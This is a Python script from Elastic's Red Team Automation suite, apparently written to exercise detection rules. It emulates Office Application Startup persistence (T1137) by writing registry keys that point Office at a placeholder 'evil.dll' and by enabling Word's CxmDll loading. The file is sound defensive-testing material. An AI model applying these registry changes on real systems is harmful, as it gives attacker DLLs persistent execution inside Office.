# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

# Name: Office Application Startup
# RTA: office_application_startup.py
# ATT&CK: T1137
# Description: Modifies the registry to persist a DLL on Office Startup.


import logging

from . import OSType, _common, register_code_rta

log = logging.getLogger(__name__)


@register_code_rta(
    id="5a979532-2b56-4c7d-b47e-a2aa1ef9547a",
    name="office_application_startup",
    platforms=[OSType.WINDOWS],
    endpoint_rules=[],
    siem_rules=[],
    techniques=[],
)
def main(dll_location="c:\\windows\\temp\\evil.dll"):
    # Write evil dll to office test path:
    subkey = "Software\\Microsoft\\Office Test\\Special\\Perf"
    _common.write_reg(_common.HKCU, subkey, "", dll_location)
    _common.write_reg(_common.HKLM, subkey, "", dll_location)

    # winreg = _common.get_winreg()
    # set_sleep_clear_key(winreg.HKEY_CURRENT_USER, subkey, "", dll_location, winreg.REG_SZ, 3)
    # set_sleep_clear_key(winreg.HKEY_LOCAL_MACHINE, subkey, "", dll_location, winreg.REG_SZ, 3)

    # Turn on Office 2010 WWLIBcxm persistence
    subkey = "Software\\Microsoft\\Office\\14.0\\Word"
    _common.write_reg(_common.HKCU, subkey, "CxmDll", 1, _common.DWORD)

    # set_sleep_clear_key(winreg.HKEY_CURRENT_USER, subkey, "CxmDll", 1, winreg.REG_DWORD, 0)

    return _common.SUCCESS
